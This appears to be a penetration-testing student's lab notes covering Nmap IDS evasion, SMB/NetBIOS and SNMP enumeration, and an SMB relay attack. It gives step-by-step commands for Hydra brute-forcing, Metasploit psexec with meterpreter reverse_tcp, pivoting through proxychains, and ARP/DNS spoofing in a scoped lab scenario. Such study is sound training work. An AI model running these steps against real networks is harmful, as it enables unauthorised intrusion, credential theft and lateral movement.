
---

## Firewall Detection & IDS Evasion

We can ACK scan with Nmap using -sA on particular ports to see if there are firewalls blocking our scan. If there was a firewall protecting these ports, we will get the State of each port as:"filtered". This will also mean that we are most likely dealing with Windows system.

We can use the fragment packets technique using -f to make it harder for IDS to discover our scan.

We can also set the maximum  transmission unit  by using -mtu (multiple of 8) to force Nmap to send packets with a certain maximum size, making it harder for firewalls and IDS to detect.

We can also use multiple IP addresses as decoy using -D (We can't use an IP address that is not in the same network that we are connected to). To make it more confusing on a SOC analyst that might be monitoring our scan, we can set the data length by using --data-length (number) so the fragmented data would be spread more. 

We can change the source of the source port of our scan by using -g (port number)


---

## SMB & NetBIOS Enumeration


### NetBIOS

NetBIOS is an API and a set of network protocols for providing communication services over a local network. It is used primarily to allow applications on different computers to find and interact with each other on a network.

**Functions:** NetBIOS offers three primary services:
- Name Service (NetBIOS-NS): Allows computers to register, unregister, and resolve names in a local network.
- Datagram Service (NetBIOS-DGM): Supports connection-less communication and broadcasting.
- Session Service (NetBIOS-SSN): Supports connection-oriented communication for more reliable data transfers.

**Ports**: NetBIOS typically uses ports 137 (Name Service), 138 (Datagram Service), and 139  (Session Service) over UDP and TCP

### SMB

SMB is a network file sharing protocol that allows computers on a network to share files, printers, and other resources. It is the primary protocol used in Windows networks for these purposes.

**Functions:** SMB provides features for file and printer sharing, named pipes, and inter-process communication (IPC). It allows users to access files on remote computers as if they were local.

**Versions:** SMB has several versions:
- SMB 1.0: The original version, which had security vulnerabilities. It was used with older OS like Windows XP.
- SMB 2.0/2.1: Introduced with Windows Vista/ Windows Server 2008, offering improved performance and security.
- SMB 3.0+: Introduced with Windows 8.0/Windows Server 2012, adding features like encryption, multichannel support, and improvements for virtualization. 

**Ports**: SMB generally uses port 445 for direct SMB traffic (bypassing NetBIOS), and port 139 when operating with NetBIOS

While NetBIOS and SMB were once closely linked, modern networks rely primarily on SMB for file and printer sharing, often using DNS and other mechanisms for name resolution instead of NetBIOS.
Modern implementations of Windows primarily use SMB and can work without NetBIOS, however, NetBIOS over TCP 139 is required for backward compatibility and are often enabled together.

We can use this Nmap script:"smb-protocols.nse" to see what versions of SMB is supported.

To see what security is applied to the SMB service, we can use this Nmap script:"smb-security-mode.nse"

**We can run all of the SMB enumeration scripts within Nmap like so: `nmap -Pn --script=smb-enum* -p139,445 -v (target)`**

This will run multiple enumerations scripts showing us what valid usernames are used in the service.

Then we can brute-force the SMB service using Hydra with a list of valid usernames: `hydra -L (valid usernames lis) -P (list of passwords) (target IP) smb`

If there is another target on the first target machine that we got access to, we can do the following steps to get access to the next machine that is running SMB service:

1. We will use the MSF module:"windows/smb/psexec" and set the payload to:"windows/x64/meterpreter/reverse_tcp" if the original payload didn't work.
2. On the meterpreter session we got:`run autoroute -s (the subnet of our second target)` . For example, if our second target IP address was :"10.0.18.53", its subnet will be:"10.0.18.0/24" 
3. We will use MSF module:"auxiliary/server/socks_proxy" If our local machine has proxychains4.conf, we will change the version of the MSF module to 4a instead of 5
4. We can take a look at the proxychains4.conf file under "/etc". At the end of the file we can see the port number it was sat for in default which is 9050. We need to change the SRVPORT option in the MSF module to the same port number. Then we hit run.
5. Now, we can use proxychaines to perform an Nmap scan on the second target:`proxychains (Nmap command)`
6. Now, we can see what services running on ports on the second target.
7. On the meterpreter session we got earlier, we will start a shell session, then:`net view (second target IP)` . We will get access denied.
8. We will migrate to explorer.exe from the meterpreter session: `migrate -N explorer.exe`
9. Now, if we got a shell session and did the same thing in the previous step, we will be able to see the shares on the second target
10. We can list the contents of them:`dir \\(second target IP)\(share name)`
11. We can see the content of files under a specific share: `type \\(second target IP)\(share name)\(filename)` 

---

## SNMP (Simple Network Management Protocol) Enumeration

SNMP is a widely used protocol for monitoring and managing networked devices, such as routers, switches, printers, servers and more.

It allows network administrators to query devices for status information, configure certain settings, and receive alerts or traps when specific events occur.

SNMP is an application layer protocol that typically uses UDP for transport. It involves three primary components:
- **SNMP Manager:** The system responsible for querying and interacting with SNMP agents on networked devices.
 - **SNMP Agent**: Software running on networked devices that responds to SNMP queries and sends traps.
 - **Management Information Base (MIB)**: A hierarchical database that defines the structure of data available through SNMP. Each piece of data has a unique Object Identifier (OID)


Versions of SNMP:
- **SNMPv1**: The earliest version, using community strings (essentially passwords) for authentication.
- **SNMPv2c:** An improved version with support for bulk transfers but still relying on community strings for authentication
- **SNMPv3:** Introduced security features, including encryption, message integrity, and user-based authenticaion.

Port:
- **Port 161 (UDP**: Used for SNMP queries.
- **Port 162 (UDP**: Used for SNMP traps (notifications).

To to a comprehensive scan on a target running SNMP: `nmap -Pn -sU -A --script=snmp* -p161,162 -v demo.ine.local

After we get the usernames, we can use hydra like so: `hydra -l (username) -P (list of passwords) (target IP) smb`

We can then use MSF module:"windows/smb/psexec" to get a meterpreter session

---

## SMB Relay Attack


SMB relay attack is a type of network attack where an attacker intercepts SMB traffic, manipulates it, and relays it to a legitimate server to gain unauthorized access to resources or perform malicious actions.

This type of attack is common in Windows networks, where SMB is used for file sharing, printer sharing, and other network services.

### How SMB Relay Attacks Work

- **Interception**: The attacker sets up a man-in-the-middle position between the client and the server. This can be done using various techniques, such as ARP spoofing, DNS poisoning or setting up a rouge SMB server.
- **Capturing Authentication:** When a client connects to a legitimate server via SMB, it sends authentication data. The attacker captures this data, which might include NTLM (NT LAN Manager) hashes.
- **Relaying to a Legitimate Server:** Instead of decrypting the captured NTLM hash, the attacker relays it to another server that trusts the source. This allows the attacker to impersonate the user whose hash was captured.
- **Gain Access:** If the relay is successful, the attacker can gain access to the resources on the server, which might include sensitive files, databases, or administrative privileges. This access could lead to further lateral movement within the network, compromising additional systems.

**Note:** Since the related lab of this topic is scenario based, the scenario will be written below:

### Scenario

You are hired by a small company to perform a security assessment. Your customer is **sportsfoo.com** and they want your help to test the security of their environment, according to the scope below:

**The assumptions of this security engagement are:**

1. You are going to do an internal penetration test, where you will be connected directly into their LAN network **172.16.5.0/24**. The scope in this test is only the **172.16.5.0/24** segment
    
2. You are in a production network, so you should not lock any user account by guessing their usernames and passwords
    

The following image represents the LAB environment:


![[Pasted image 20250216195037.png]]

---

### LAB Solution

We will use this MSF module: "exploit/windows/smb/smb_relay" and set SRVHOST and LHOST to our IP address. We also set the SMBHOST to our target machine IP then we run it.

We will create a file that will act as DNS for dns spoofing procedure: `echo "(our IP address) *.sportsfoo.com"> dns` This will point all requests for sportsfoo.com to our Kali Linux machine 

Then we do: `dnsspoof -i eht1 -f dns`


Now, for our arp-spoofing attack. First, we will allow our machine to act as a router, forwarding network packets between devices:`echo 1 > /proc/sys/net/ipv4/ip_forward`

Then will set the arp-spoof attack against the client machine: `arpspoof -i eth1 -t (client IP) (gateway IP)`

On another tab, we will set another arp-spoof but we will flip the client and the gateway IP addresses with each other: `arpspoof -i eth1 -t (gateway IP) (client IP)`

If we returned back to MSF, we find that we have a meterpreter session in the background.

